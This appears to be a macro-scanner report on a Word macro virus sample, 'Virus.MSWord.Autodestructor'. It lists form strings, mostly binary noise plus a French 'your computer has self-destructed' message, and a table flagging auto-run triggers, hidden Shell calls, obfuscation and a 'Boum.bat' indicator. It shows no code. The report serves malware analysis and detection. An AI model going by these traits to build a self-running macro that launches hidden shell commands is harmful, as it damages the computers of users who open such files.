VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��z�k��dhC�EK��'Y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZN~:4��l�BE�Q=}�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y�+fԞ%5iJ#
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S��t�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��M;*Ӛ�T���NK�yЛ�T����O��S�vӣ�4��zfQ񹴨5��VC�U��4�=��I�:ՖQRa{��ZAJ��U�O��R
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JV�R���S�Z�:W�r��ouk8S�M��T�!3����׿Γ�!sh`��Ӎ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����+ eB'�*
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'�,b+
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U���ifWz��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.�a]��j�
�Ѧ���=�_
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z������)O��V����ly��af%V���OE�[�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��8�h9S�U�=MT@��*�ZO�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w��-�=��P`
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
UHê[,��O�r����h~���c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ιa�%��[��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��8�K��:�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R�|�F��&
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�XU�Q�������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���k�ݚ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��%��;Z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C��|�+�ol^�*��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ل�T�֍�r��b��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p�b��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#$�WN0M5��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�v��Ɔ��ƴE���M{_
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̬��L��i�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0���J;�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_j���KE�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Q�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ҍ �|�)w
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�M���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ͼ�Ȧ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
қ�3�rXh�1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��
2�X���}
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ժ)�h0W
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ϒ5���k<�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
΀��,�iH
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z��L�����f;;�N��+u��:���Ď_5�-�n{���6[�ƽ�C	�ԸL7���drk�ݞ�����Xv�M8��6!=ln@۵�������G�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@u�&��Duñ���u�0>�M��Q�x���=�躓̼�t#QNr2�6�%����;��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;X�ڼ�(�����Z&�d
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ҳ�#ej%r�VH�7�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6;����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Kw�Ŭ-�3�X�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����5}�a�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���[i
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��%�Z�_�o׺}�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
С���xW_�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
䴗�U�����ݫwO����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q4}�����>w�z�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>�ѻ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	�������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?�ui~@�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��A���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>��:�?�y���gH��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��}���|�s���x}�M>/
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���m���_"���q�:���D?�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y�.؇�������^�PI���E~�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q.j�I
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�G�%#�ac�y�#BI
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
||�2�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y��<�6��Q��'z�7(}������vy$�#!�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�vlā�т
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��WQrT��'�?�i:X|<�[
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ua��G�DX�Ah{ܗ�׷�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��N�v7���7�J
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�\hwU�iaH
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y`X�y�t9��%(wi��.)(���1v8�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4�h���#��LӈXx:�ȅ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8������t����D����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��8��X��x�V
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Cliquez ici
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomax
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Votre ordinateur vient de s'autod�truire....�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomax
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN './Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Boum.bat            |Executable file name                         |
|Hex String|33?3                |33333f33                                     |
+----------+--------------------+---------------------------------------------+

